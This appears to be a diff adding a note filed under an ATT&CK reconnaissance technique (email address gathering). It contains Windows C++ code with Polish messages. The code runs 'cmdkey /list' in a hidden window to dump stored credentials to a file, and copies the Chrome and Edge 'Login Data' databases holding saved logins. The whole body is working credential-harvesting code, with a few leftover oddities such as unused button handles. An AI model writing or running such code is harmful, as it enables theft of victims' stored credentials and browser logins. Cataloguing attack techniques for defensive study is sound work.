@@ -1,0 +1,144 @@
+---
+title: ".002 Email Addresses"
+folder: "01. Reconnaissance/T1589. Gather Victim Identity Information"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+HWND systemInfoButton;
+HWND deviceManagerButton;
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
+
+void RunSystemInfoInBackground() {
+    std::ofstream outputFile("Email_z_poczty_win.txt");
+
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    HANDLE hReadPipe, hWritePipe;
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
+        std::cerr << "Błąd tworzenia potoku." << std::endl;
+        outputFile << "Błąd tworzenia potoku." << std::endl;
+        outputFile.close();
+        return;
+    }
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdError = hWritePipe;
+    si.hStdOutput = hWritePipe;
+
+    PROCESS_INFORMATION pi;
+    const char* command = "cmdkey /list";  
+    if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        std::cerr << "Błąd uruchamiania systeminfo. Kod błędu: " << GetLastError() << std::endl;
+        outputFile << "Błąd uruchamiania systeminfo. Kod błędu: " << GetLastError() << std::endl;
+        outputFile.close();
+        return;
+    }
+
+    CloseHandle(hWritePipe);
+    const int BUFFER_SIZE = 4096;
+    char buffer[BUFFER_SIZE];
+    DWORD bytesRead;
+
+    while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
+        std::string data(buffer, bytesRead);
+        size_t pos = 0;
+
+        while ((pos = data.find("\n", pos)) != std::string::npos) {
+            data.erase(pos, 1);  
+        }
+
+        outputFile.write(data.c_str(), data.size());
+    }
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    outputFile.close();
+}
+
+void BrowserGetEmailChrome() {
+    std::string sourcePath = "C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+    std::string fileName = "SkopiowanyPlikChrome";
+
+    char buffer[MAX_PATH];
+    GetModuleFileNameA(NULL, buffer, MAX_PATH);
+    std::string currentLocation(buffer);
+
+    std::string destinationPath = currentLocation.substr(0, currentLocation.find_last_of("\\") + 1) + fileName;
+
+    std::ifstream sourceFile(sourcePath, std::ios::binary);
+    if (!sourceFile.is_open()) {
+        std::cerr << "Nie można otworzyć pliku źródłowego." << std::endl;
+        return;
+    }
+
+    std::ofstream destinationFile(destinationPath, std::ios::binary);
+    if (!destinationFile.is_open()) {
+        std::cerr << "Nie można otworzyć pliku docelowego." << std::endl;
+        return;
+    }
+
+    destinationFile << sourceFile.rdbuf();
+
+    sourceFile.close();
+    destinationFile.close();
+
+    std::cout << "Plik skopiowany pomyślnie do lokalizacji uruchomionego pliku." << std::endl;
+}
+
+void BrowserGetEmailEdge() {
+    std::string sourcePath = "C:\\Users\\User\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
+    std::string fileName = "SkopiowanyPlikEdge";
+
+    char buffer[MAX_PATH];
+    GetModuleFileNameA(NULL, buffer, MAX_PATH);
+    std::string currentLocation(buffer);
+
+    std::string destinationPath = currentLocation.substr(0, currentLocation.find_last_of("\\") + 1) + fileName;
+
+    std::ifstream sourceFile(sourcePath, std::ios::binary);
+    if (!sourceFile.is_open()) {
+        std::cerr << "Nie można otworzyć pliku źródłowego." << std::endl;
+        return;
+    }
+
+    std::ofstream destinationFile(destinationPath, std::ios::binary);
+    if (!destinationFile.is_open()) {
+        std::cerr << "Nie można otworzyć pliku docelowego." << std::endl;
+        return;
+    }
+
+
+    destinationFile << sourceFile.rdbuf();
+
+    sourceFile.close();
+    destinationFile.close();
+
+    std::cout << "Plik skopiowany pomyślnie do lokalizacji uruchomionego pliku." << std::endl;
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    RunSystemInfoInBackground();
+
+
+    BrowserGetEmailChrome();
+    BrowserGetEmailEdge();
+
+    return 0;
+}
+
